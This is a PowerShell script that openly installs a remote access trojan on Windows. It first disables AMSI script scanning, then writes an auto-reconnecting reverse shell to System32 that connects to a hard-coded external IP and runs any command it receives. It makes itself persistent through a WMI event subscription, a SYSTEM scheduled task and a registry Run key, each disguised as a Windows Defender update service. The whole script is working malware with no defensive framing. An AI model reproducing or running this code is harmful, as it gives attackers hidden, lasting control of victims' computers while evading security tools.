#Requires -RunAsAdministrator

# AMSI Bypass
[Ref].Assembly.GetTypes() | ForEach-Object {
    if ($_.Name -like "*iUtils") {
        $_.GetFields('NonPublic,Static') | ForEach-Object {
            if ($_.Name -like "*Context") {
                $_.SetValue($null, [IntPtr]::Zero)
            }
        }
    }
}

Write-Host "[*] Installing persistent RAT..." -ForegroundColor Cyan

# Configuration
$C2_IP = "152.53.38.5"
$C2_PORT = 443
$SERVICE_NAME = "WinDefenderUpdateSvc"
$INSTALL_PATH = "$env:SystemRoot\System32\WindowsUpdateAssist.ps1"

# Core payload - auto-reconnecting reverse shell
$payload = @"
while (`$true) {
    try {
        `$client = New-Object System.Net.Sockets.TCPClient('$C2_IP', $C2_PORT)
        `$stream = `$client.GetStream()
        `$writer = New-Object System.IO.StreamWriter(`$stream)
        `$buffer = New-Object System.Byte[] 8192
        `$encoding = New-Object System.Text.AsciiEncoding
        
        `$writer.WriteLine("Connected from: `$env:COMPUTERNAME as `$env:USERNAME")
        `$writer.Flush()
        
        while ((`$read = `$stream.Read(`$buffer, 0, `$buffer.Length)) -gt 0) {
            `$command = `$encoding.GetString(`$buffer, 0, `$read).Trim()
            
            if (`$command -eq 'exit') { break }
            
            try {
                `$output = Invoke-Expression `$command 2>&1 | Out-String
            } catch {
                `$output = "Error: `$(`$_.Exception.Message)"
            }
            
            `$writer.WriteLine(`$output)
            `$writer.Flush()
        }
        
        `$client.Close()
    } catch {
        Start-Sleep -Seconds 30
    }
}
"@

# Write payload to System32 (survives most imaging)
$payload | Out-File -FilePath $INSTALL_PATH -Encoding ASCII -Force
Write-Host "[+] Payload written to: $INSTALL_PATH" -ForegroundColor Green

# Encode for fileless execution
$encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

# Persistence Method 1: WMI Event Subscription
Write-Host "[*] Setting up WMI persistence..." -ForegroundColor Cyan

# Clean existing instances first
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$SERVICE_NAME'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$SERVICE_NAME'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Consumer -like "*$SERVICE_NAME*" } | Remove-WmiObject

# Create filter - triggers 90 seconds after system boot
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = $SERVICE_NAME
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 90 AND TargetInstance.SystemUpTime < 150"
}

# Create consumer - execute payload
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = $SERVICE_NAME
    CommandLineTemplate = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$INSTALL_PATH`""
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
} | Out-Null

Write-Host "[+] WMI persistence installed" -ForegroundColor Green

# Persistence Method 2: Scheduled Task (backup mechanism)
Write-Host "[*] Setting up Scheduled Task backup..." -ForegroundColor Cyan

$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$INSTALL_PATH`""

$trigger1 = New-ScheduledTaskTrigger -AtStartup
$trigger2 = New-ScheduledTaskTrigger -AtLogOn

$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RestartCount 999 `
    -RestartInterval (New-TimeSpan -Minutes 1) `
    -ExecutionTimeLimit (New-TimeSpan -Days 365)

Register-ScheduledTask -TaskName $SERVICE_NAME `
    -Action $action `
    -Trigger $trigger1,$trigger2 `
    -Principal $principal `
    -Settings $settings `
    -Force | Out-Null

Write-Host "[+] Scheduled Task installed" -ForegroundColor Green

# Persistence Method 3: Registry Run key (tertiary backup)
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name $SERVICE_NAME `
    -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$INSTALL_PATH`"" `
    -Force

Write-Host "[+] Registry persistence installed" -ForegroundColor Green

# Immediate execution
Write-Host "[*] Starting RAT immediately..." -ForegroundColor Cyan
Start-Process powershell.exe -ArgumentList "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$INSTALL_PATH`"" -WindowStyle Hidden

Write-Host "`n[SUCCESS] Installation Complete!" -ForegroundColor Green
Write-Host "[+] C2 Server: $C2_IP`:$C2_PORT" -ForegroundColor Green
Write-Host "[+] Persistence: WMI + Task + Registry" -ForegroundColor Green
Write-Host "[+] Payload Location: $INSTALL_PATH" -ForegroundColor Green
Write-Host "[+] Service Name: $SERVICE_NAME" -ForegroundColor Green
Write-Host "`n[*] RAT will auto-start on next reboot" -ForegroundColor Cyan
Write-Host "[*] Connection attempts every 30s if server is down" -ForegroundColor Cyan
